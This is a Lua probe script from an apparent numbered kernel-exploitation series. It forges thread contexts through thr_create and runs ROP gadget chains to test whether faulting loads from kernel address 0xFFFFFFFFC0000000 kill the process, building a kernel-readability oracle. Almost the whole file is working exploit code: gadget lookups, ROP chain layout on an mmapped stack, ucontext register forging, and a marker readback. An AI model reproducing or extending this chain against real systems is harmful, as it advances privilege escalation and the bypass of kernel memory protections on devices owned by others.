-- CRASH_CLASS: MODERATE
-- PROBE 1458a: is a fault on the child's FIRST instruction contained when it is a DATA fault?
--
-- Context:
--   1331a spawned 512 thr_create(430) children whose RIP was a kernel address; every one of them
--   faulted on the instruction FETCH and the parent survived all 512.  That is the fault oracle.
--
--   1457a ran a ROP chain in the same harness: the chain loaded a user page (control OK), then
--   loaded a kernel page and the WHOLE PROCESS died.  So a fault in the middle of a chain is not
--   contained.  Two differences remain unexplained:
--       (a) first instruction vs middle of a chain
--       (b) instruction fetch vs data load
--
--   This probe separates them.  [B] repeats 1331a exactly (RIP = kernel address, fetch fault) and
--   must survive, which validates the harness in this run.  [C] is the same fault page but reached
--   as the child's FIRST instruction with a DATA load: RIP = "mov rax,[rax]; ret", RAX = target,
--   RDI = marker, RSP -> [store][exit].  A kill in [C] but not [B] proves the difference is
--   fetch-vs-data; survival in [C] gives a multi-target readability oracle.
--
--   Why readability is still open: bit 2 of the #PF error word means "the access came from CPL3",
--   not "the PTE has U set", so the oracle's error word 5 cannot separate a supervisor page from a
--   user-accessible NX page.  1331a measured execute permission only.
--
-- -- prior art:
--   .local/1331a.lua + results/1331a_20261109_094441.txt (512 contained FETCH faults)
--   probes/phase36_realargs/1457a_kernel_readable_thrcreate.lua + results/..._174702.txt
--     (chain control OK, mid-chain data load at 0xFFFFFFFFC0000000 killed the process)
--   probes/phase17_new_vectors/156d_thr_create_child_executes.lua:76-77 (ucontext GPR offsets)
--   results/phase17_new_vectors/384b_child_write_minimal.lua (chain shapes)

print("=== PROBE 1458a: FIRST-INSTRUCTION DATA FAULT CONTAINMENT ===")
print("")

local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(uint64(a)) end) if ok then return v end return nil end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function fmt(v) if v==nil then return "nil" end local h,l=hi_lo(v) return string.format("0x%08X%08X",h,l) end

local pid0 = to_num(mk(20)())
print(string.format("[0] pid=%d", pid0))

local g_pop_rax = gadgets["pop rax; ret"]
local g_pop_rdi = gadgets["pop rdi; ret"]
local g_load    = gadgets["mov rax, [rax]; ret"]
local g_store   = gadgets["mov [rdi], rax; ret"]
local g_ret     = gadgets["ret"]
print(string.format("[0] pop_rax=%s load=%s store=%s ret=%s",
    fmt(g_pop_rax), fmt(g_load), fmt(g_store), fmt(g_ret)))
if not (g_pop_rax and g_pop_rdi and g_load and g_store and g_ret) then
    print("[!] gadget missing"); print("=== PROBE 1458a COMPLETE ==="); return
end
local stub = syscall.pipe.fn_addr

local function mmap(px)
    local ok,a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = ok and to_num(a) or 0
    if v ~= 0 and v < 0x8000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end

local MARK_BLK = memory.alloc(0x20)
local MARK = as_addr(MARK_BLK)
local SENT = 0xCAFEBABE

local blk = mmap(0x10000)
if blk <= 0 then print("[!] mmap failed"); print("=== PROBE 1458a COMPLETE ==="); return end
local ss = 0x10000
local STOP = blk + ss - 0x400          -- chain lives at [STOP, STOP+0x58]; 0x400 above is slack
local FETCH_STACK = blk + ss - 0x800   -- plain stack for the fetch-fault control
print(string.format("[0] blk=0x%X chain_rsp=0x%X fetch_rsp=0x%X mark=0x%X", blk, STOP, FETCH_STACK, MARK))

-- [C] chain: the data load IS the first instruction; RSP points at the store.
wq(STOP +  0, g_store)
wq(STOP +  8, g_pop_rdi)
wq(STOP + 16, 0)
wq(STOP + 24, g_pop_rax)
wq(STOP + 32, 431)
wq(STOP + 40, stub)

local Ctx = {RDI=0x048, RAX=0x078, MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100}
local ctx = memory.alloc(0x500)
local ctxa = as_addr(ctx)
local tb = memory.alloc(8)
local ts = memory.alloc(16)

local function spawn(rip, rsp, rax, rdi, tag)
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(ctxa + Ctx.MAGIC, 0x480)
    wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43)
    wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, rip)
    wq(ctxa + Ctx.RSP, rsp)
    wq(ctxa + Ctx.RAX, rax)
    wq(ctxa + Ctx.RDI, rdi)
    wq(as_addr(tb), 0)
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa), uint64(as_addr(tb)), uint64(0)) end)
    return ok and to_num(rv) or -999
end

local function sleep_ms(ms)
    wq(as_addr(ts), 0); wq(as_addr(ts) + 8, ms * 1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)), uint64(0)) end)
end

local function report(tag, rv)
    sleep_ms(80)
    local raw = rq(MARK)
    print(string.format("[%s] thr_create=%d marker=%s %s", tag, rv, fmt(raw),
        (to_num(raw) == SENT) and "(sentinel: the load faulted or never ran)" or "(MARKER CHANGED: the load succeeded)"))
    print("")
end

-- [A] control: data load of a USER page as the first instruction. Must change the marker.
local CTRL = memory.alloc(0x20)
wq(as_addr(CTRL), uint64(0x41424344))
wq(MARK, uint64(SENT))
print("[A] first-instruction data load from a user page (control)")
report("A", spawn(g_load, STOP, as_addr(CTRL), MARK))

-- [B] 1331a exactly: fetch fault at 0xFFFFFFFFC0000000. Must survive or the harness is not valid.
wq(MARK, uint64(SENT))
print("[B] fetch fault at 0xFFFFFFFFC0000000 (1331a repeat, must survive)")
report("B", spawn(0xFFFFFFFFC0000000, FETCH_STACK, 0, 0))

-- [C] same page, first-instruction DATA load.
wq(MARK, uint64(SENT))
print("[C] first-instruction data load from 0xFFFFFFFFC0000000 (the discriminator)")
report("C", spawn(g_load, STOP, 0xFFFFFFFFC0000000, MARK))

print(string.format("[D] alive pid=%d (was %d)", to_num(mk(20)()), pid0))
print("")
print("=== PROBE 1458a COMPLETE ===")
